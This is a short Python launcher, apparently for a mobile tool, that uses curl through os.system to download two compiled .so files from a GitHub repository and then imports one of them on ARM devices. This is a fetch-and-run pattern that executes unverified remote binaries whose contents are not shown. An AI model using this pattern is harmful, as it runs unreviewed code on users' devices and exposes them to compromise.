import os
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("Pro.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/Pro.so -o Pro.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dz.so -o dz.so")

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
    import Pro
else:exit('\033[1;31m Sorry System or device not supported ')
    
